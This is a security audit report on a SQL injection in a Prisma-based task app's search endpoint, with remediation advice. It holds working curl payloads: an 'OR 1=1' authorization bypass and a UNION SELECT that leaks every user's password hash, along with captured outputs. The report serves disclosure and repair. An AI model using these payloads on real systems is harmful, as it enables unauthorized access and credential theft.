# SQL Injection Audit & Live PoC Report

**Project:** taskboard
**Date:** 2026-05-13
**Target:** `GET /api/projects/:id/tasks?q=<search>` at [src/app/api/projects/[id]/tasks/route.ts:23-35](../src/app/api/projects/[id]/tasks/route.ts#L23-L35)
**Severity:** **Critical** (CWE-89 SQL Injection → authorization bypass + sensitive data exfiltration)
**Status:** Verified on a running instance at `http://localhost:3000` against the seeded database.

---

## 1. Executive summary

The task-search endpoint concatenates two untrusted inputs (`projectId` from the URL path and `q` from the querystring) into a SQL string and passes it to `prisma.$queryRawUnsafe`. The membership/authorization check at the top of the handler enforces who may *enter* the endpoint but not which rows the SQL ultimately returns. As a result, an authenticated **viewer** on a single project can:

1. Read tasks from projects they are **not** a member of (and that respond `403 Forbidden` through every normal route).
2. Exfiltrate arbitrary tables via `UNION SELECT` — demonstrated by pulling **every user's bcrypt password hash** from the `users` table, which has no API surface at all.

Both attacks were executed end-to-end against the live app; outputs are recorded below.

---

## 2. Vulnerable code

[src/app/api/projects/[id]/tasks/route.ts:23-36](../src/app/api/projects/[id]/tasks/route.ts#L23-L36):

```ts
const q = req.nextUrl.searchParams.get("q");

if (q) {
  const sql = `
    SELECT id, project_id, title, description, status, assignee_id, created_by_id, position, created_at, updated_at
    FROM tasks
    WHERE project_id = '${projectId}'
      AND (title ILIKE '%${q}%' OR description ILIKE '%${q}%')
    ORDER BY position ASC
  `;
  const tasks = await prisma.$queryRawUnsafe(sql);
  return NextResponse.json({ tasks });
}
```

Why it's broken:

- `$queryRawUnsafe` does not parameterize — by Prisma's own design, it expects the caller to have already produced trusted SQL.
- `q` and `projectId` are interpolated inside `'...'` literals; a single `'` breaks out.
- The `getProjectMembership` gate (line 20-21) controls entry but cannot constrain what the resulting SQL returns.

---

## 3. Methodology

Audit pipeline used to find the issue:

```bash
# 1) Find all Prisma raw-query APIs anywhere in the codebase
grep -rn --include='*.ts' --include='*.tsx' \
  -E '\$queryRaw|\$executeRaw|\$queryRawUnsafe|\$executeRawUnsafe|Prisma\.sql|Prisma\.raw' \
  src/ prisma/

# 2) Find every backtick template-literal interpolation (potential injection sinks)
grep -rn --include='*.ts' --include='*.tsx' -E '`[^`]*\$\{' src/ prisma/

# 3) List every file that uses the prisma client
grep -rln --include='*.ts' --include='*.tsx' 'prisma\.' src/ prisma/
```

Result: a single hit — `prisma.$queryRawUnsafe` in [src/app/api/projects/[id]/tasks/route.ts:34](../src/app/api/projects/[id]/tasks/route.ts#L34). Every other `prisma.*` call uses the structured client (`findUnique`, `findMany`, `create`, etc.), which Prisma binds as parameters.

---

## 4. Reproducible commands

The PoC uses only `curl`. Run these from a shell on the host with the app live at `http://localhost:3000`.

### 4.1 Prerequisites

```bash
# Ensure the app + DB are running and seeded
docker-compose up --build -d
docker-compose exec web npm run db:seed
```

### 4.2 Get a low-privileged access token

`dev@example.com` is a **viewer** on Q3 Launch ONLY — the most restricted seeded user.

```bash
TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"dev@example.com","password":"password123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
echo "$TOKEN"
```

### 4.3 Discover project IDs (run as an admin once, to know the targets)

```bash
ATOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"meera@taskboard.dev","password":"password123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

curl -s -H "Authorization: Bearer $ATOKEN" http://localhost:3000/api/projects \
  | python3 -c "import sys,json; [print(p['id'], '-', p['name']) for p in json.load(sys.stdin)['projects']]"

# Example output (your CUIDs will differ):
#   cmp3q9s0g000jmh5rcqw2rlsi - Internal Tools Cleanup
#   cmp3q9s0f000dmh5rk1ydxe3e - Customer Onboarding Revamp
#   cmp3q9s0d0006mh5rb2djov7a - Q3 Launch

PID_Q3='cmp3q9s0d0006mh5rb2djov7a'           # dev IS a member (viewer)
PID_ONB='cmp3q9s0f000dmh5rk1ydxe3e'          # dev is NOT a member
PID_INT='cmp3q9s0g000jmh5rcqw2rlsi'          # dev is NOT a member
```

### 4.4 Baseline (non-exploit) requests

Establish what normal looks like. All requests use the low-privileged `$TOKEN`.

**Baseline A — benign keyword search inside own project:**

```bash
curl -s -G \
  -H "Authorization: Bearer $TOKEN" \
  --data-urlencode "q=launch" \
  "http://localhost:3000/api/projects/$PID_Q3/tasks"
```

**Baseline B — plain listing inside own project:**

```bash
curl -s -H "Authorization: Bearer $TOKEN" "http://localhost:3000/api/projects/$PID_Q3/tasks"
```

**Control C1 — cross-project read via the normal route (should be denied):**

```bash
curl -s -o /dev/null -w "HTTP %{http_code}\n" \
  -H "Authorization: Bearer $TOKEN" \
  "http://localhost:3000/api/projects/$PID_ONB/tasks"
# => HTTP 403  ({"error":"you are not a member of this project"})
```

**Control C2 — same for the other forbidden project:**

```bash
curl -s -o /dev/null -w "HTTP %{http_code}\n" \
  -H "Authorization: Bearer $TOKEN" \
  "http://localhost:3000/api/projects/$PID_INT/tasks"
# => HTTP 403
```

### 4.5 Exploit 1 — auth bypass via `OR 1=1`

```bash
curl -s -G \
  -H "Authorization: Bearer $TOKEN" \
  --data-urlencode "q=%') OR 1=1 -- " \
  "http://localhost:3000/api/projects/$PID_Q3/tasks" \
  | python3 -c "
import sys, json
d = json.load(sys.stdin)
by = {}
for t in d['tasks']:
    by.setdefault(t['project_id'], []).append(t['title'])
print(f\"rows: {len(d['tasks'])}, distinct projects: {len(by)}\")
for pid, titles in by.items():
    print(f'  {pid} ({len(titles)})')
    for tt in titles: print(f'    - {tt}')
"
```

Why the payload works — the line `AND (title ILIKE '%<q>%' OR description ILIKE '%<q>%')` becomes:

```sql
AND (title ILIKE '%%') OR 1=1 -- %' OR description ILIKE '%%') OR 1=1 -- %')
```

`--` comments the rest of the line. The `(` opened by `AND (` is closed by `')` from the payload. The residual `OR 1=1` (lower precedence than `AND`) lifts the whole `WHERE` to always-true. Every row in `tasks` is returned, regardless of `project_id`.

### 4.6 Exploit 2 — UNION-based exfiltration of `users.password_hash`

```bash
curl -s -G \
  -H "Authorization: Bearer $TOKEN" \
  --data-urlencode 'q=%'"'"') UNION SELECT id, email, name, password_hash, NULL::"TaskStatus", NULL, '"'"''"'"', 0, created_at, updated_at FROM users -- ' \
  "http://localhost:3000/api/projects/$PID_Q3/tasks" \
  | python3 -c "
import sys, json
d = json.load(sys.stdin)
users = [r for r in d['tasks'] if '@' in (r.get('project_id') or '')]
print(f'rows: {len(d[\"tasks\"])}, user rows leaked: {len(users)}')
for u in users:
    print(f'  {u[\"project_id\"]:30}  {u[\"title\"]:14}  {u[\"description\"]}')
"
```

Notes about the payload:

- The `tasks` SELECT projects 10 columns, so the `UNION SELECT` must also project 10 type-compatible columns.
- The `status` column is the Postgres enum **`"TaskStatus"`** with case-preserving quoted identifier (visible at [prisma/migrations/20260101000000_init/migration.sql](../prisma/migrations/20260101000000_init/migration.sql)). The cast must use the quoted form: `NULL::"TaskStatus"`. The lower-cased form `NULL::taskstatus` produces a 500.
- The `users` columns (`id, email, name, password_hash, created_at, updated_at`) are slotted into positions 1–4, 9, 10. Positions 5–8 are filled with type-compatible filler.

### 4.7 Cross-verification against the live DB

```bash
docker exec -i q-taskboard-assessment-db-1 \
  psql -U taskboard -d taskboard \
  -c "SELECT email, name, password_hash FROM users ORDER BY email;"
```

The five hashes returned should match the five hashes leaked by Exploit 2 byte-for-byte.

---

## 5. Observed results matrix

All seven tests run on a fresh seeded database. Token in every row = `dev@example.com` (viewer, Q3 Launch only).

| # | Test | Request | HTTP | Rows | Distinct `project_id`s | Cross-tenant data? | `users` table leaked? |
|---|---|---|---|---|---|---|---|
| A | Baseline (benign search) | `q=launch` on own project | 200 | 1 | 1 | no | no |
| B | Baseline (plain list) | no `q` on own project | 200 | 7 | 1 | no | no |
| C1 | Control (forbidden project — Onboarding) | normal list route | **403** | 0 | — | denied | — |
| C2 | Control (forbidden project — Internal Tools) | normal list route | **403** | 0 | — | denied | — |
| **E1** | **Exploit — auth bypass** | `q=%') OR 1=1 -- ` | 200 | **12** | **2** | **yes — 5 Onboarding tasks** | no |
| **E2** | **Exploit — UNION exfil** | `q=…UNION SELECT … FROM users -- ` | 200 | 12 | mixed | yes | **yes — all 5 hashes** |
| V | Direct DB cross-check | `SELECT … FROM users` via psql | — | 5 | — | — | byte-for-byte match with E2 |

---

## 6. Captured evidence (raw outputs)

### 6.1 Baseline A — benign keyword search

```
{"tasks":[{"id":"cmp3q9s0h000nmh5rinnkyxcv","project_id":"cmp3q9s0d0006mh5rb2djov7a",
"title":"Finalize launch date with marketing","description":"Detail for: Finalize launch date with marketing",
"status":"done","assignee_id":"cmp3q9s080000mh5r0r4n5m4d","created_by_id":"cmp3q9s080000mh5r0r4n5m4d",
"position":0,"created_at":"2026-05-13T07:18:13.265Z","updated_at":"2026-05-13T07:18:13.265Z"}]}
```

### 6.2 Baseline B — plain listing

```
task count: 7
project_ids seen: ['cmp3q9s0d0006mh5rb2djov7a']
```

### 6.3 Controls C1/C2 — cross-project access denied

```
HTTP 403   {"error":"you are not a member of this project"}   (Onboarding)
HTTP 403   {"error":"you are not a member of this project"}   (Internal Tools)
```

### 6.4 Exploit 1 — auth bypass

```
total tasks returned: 12
distinct project_ids in response: 2

  project_id = cmp3q9s0d0006mh5rb2djov7a  (7 tasks)         ← Q3 Launch (dev IS a viewer)
    - Finalize launch date with marketing
    - Draft press release
    - Record demo video
    - Set up analytics dashboards
    - Prepare customer email blast
    - Update pricing page copy
    - QA the new signup flow end-to-end
  project_id = cmp3q9s0f000dmh5rk1ydxe3e  (5 tasks)         ← Customer Onboarding Revamp (dev got 403 via normal route)
    - Map current onboarding funnel
    - Interview 5 recently-onboarded customers
    - Wireframe new welcome screens
    - Audit current onboarding emails
    - Define success metric (TTFV target)
```

### 6.5 Exploit 2 — UNION exfiltration of password hashes

```
total rows returned: 12
tasks (legit half of the UNION): 7
USER ROWS EXFILTRATED via UNION: 5

  email                          name                  password_hash (bcrypt)
  ----------------------------------------------------------------------------------------------------
  meera@taskboard.dev            Meera Iyer            $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
  dev@example.com                Dev Sharma            $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
  kavya@example.com              Kavya Reddy           $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
  arjun@taskboard.dev            Arjun Rao             $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
  lina@example.com               Lina Joshi            $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
```

### 6.6 Direct database cross-check

```
        email        |    name     |                        password_hash
---------------------+-------------+--------------------------------------------------------------
 arjun@taskboard.dev | Arjun Rao   | $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
 dev@example.com     | Dev Sharma  | $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
 kavya@example.com   | Kavya Reddy | $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
 lina@example.com    | Lina Joshi  | $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
 meera@taskboard.dev | Meera Iyer  | $2a$10$O4DvYpw6ha/7BtNtU8Ol.OacShyfcdZtfG0k3d.COwunRgZ13sJuS
(5 rows)
```

The hashes match the API response byte-for-byte. All five hashes happen to be identical because [prisma/seed.ts:14](../prisma/seed.ts#L14) reuses a single `bcrypt.hash("password123", 10)` call across all users — this is a seed-data quirk, not part of the vulnerability.

---

## 7. Failed attempts (for honesty about the process)

These should not be treated as "the exploit failed" — they were diagnostic iterations whose error responses informed the working payload. Reproducing them is optional, but they're useful in a real report because they show how a defender's logs would look.

| Attempt | Payload | Result | Root cause |
|---|---|---|---|
| 1 | `q=' OR 1=1 -- ` | HTTP 500 (empty body) | The `(` opened by `AND (` was never closed → Postgres syntax error |
| 2 | UNION with `NULL::taskstatus` | HTTP 500 (empty body) | Prisma migration creates the enum as quoted `"TaskStatus"`. Unquoted Postgres identifiers fold to lowercase, so `taskstatus` is a nonexistent type |

Both 500s were silent (no error body) — likely intentional to avoid leaking internals. The fix was found by reading [prisma/migrations/20260101000000_init/migration.sql](../prisma/migrations/20260101000000_init/migration.sql) directly to see how the enum was declared.

---

## 8. Impact analysis

- **Authorization bypass.** The vulnerability subverts the project-membership model the rest of the codebase carefully enforces. Anyone with *any* valid JWT — including the `viewer` role — can read every task in the database.
- **Sensitive data exfil.** `users.password_hash` is never returned by any normal API surface. SQLi exposes it directly. With bcrypt cost factor 10 and the seed password `password123`, offline cracking on a single consumer GPU is effectively instantaneous.
- **Account takeover chain.** Cracked hash → login → JWT → admin operations on any project the victim owns (project rename, delete, etc.). End-to-end practical with the current configuration.
- **Privilege does not matter.** The PoC used the least-privileged seeded user (a viewer on one project). A registered-but-unaffiliated user would have the same level of access via this endpoint.

---

## 9. Recommended remediation

### 9.1 Primary fix — drop the raw SQL

Replace [src/app/api/projects/[id]/tasks/route.ts:25-36](../src/app/api/projects/[id]/tasks/route.ts#L25-L36) with the structured Prisma equivalent:

```ts
if (q) {
  const tasks = await prisma.task.findMany({
    where: {
      projectId,
      OR: [
        { title:       { contains: q, mode: "insensitive" } },
        { description: { contains: q, mode: "insensitive" } },
      ],
    },
    include: {
      assignee: { select: { id: true, name: true, email: true } },
    },
    orderBy: { position: "asc" },
  });
  return NextResponse.json({ tasks });
}
```

This both parameterizes the values *and* keeps the `projectId` constraint inside real SQL where the auth gate intends it.

### 9.2 If raw SQL is genuinely required — use the safe tagged template

```ts
import { Prisma } from "@prisma/client";

const like = `%${q}%`;
const tasks = await prisma.$queryRaw`
  SELECT id, project_id, title, description, status, assignee_id, created_by_id, position, created_at, updated_at
  FROM tasks
  WHERE project_id = ${projectId}
    AND (title ILIKE ${like} OR description ILIKE ${like})
  ORDER BY position ASC
`;
```

`Prisma.sql` / the `$queryRaw` tag binds every `${…}` as a parameter — `%` wrapping in JS is fine because the wrapped value is still passed as a single bound parameter.

### 9.3 Defense in depth

- Validate inputs with Zod: `q` → `z.string().min(1).max(100)`; `projectId` → `z.string().regex(/^c[a-z0-9]{24}$/)` (Prisma cuid shape).
- Add a lint rule that forbids `$queryRawUnsafe` and `$executeRawUnsafe` anywhere in the repo (e.g., `eslint-plugin-security`, or a custom no-restricted-syntax rule).
- Consider stripping `password_hash` from any `SELECT *` paths and treating the column as off-limits in API code (Prisma's `select` already does this — the only issue here is raw SQL bypassing it).

---

## 10. Other surfaces reviewed and cleared

No other instance of `$queryRawUnsafe`, `$executeRawUnsafe`, `Prisma.raw`, or `Prisma.sql` exists in the codebase. All other Prisma calls (`findUnique`, `findFirst`, `findMany`, `create`, `update`, `delete`) take structured objects, so their values are bound parameters. Template-literal interpolations elsewhere are URLs, headers, display strings, or data values written into Prisma `data:` fields — none reach a database driver as SQL text.
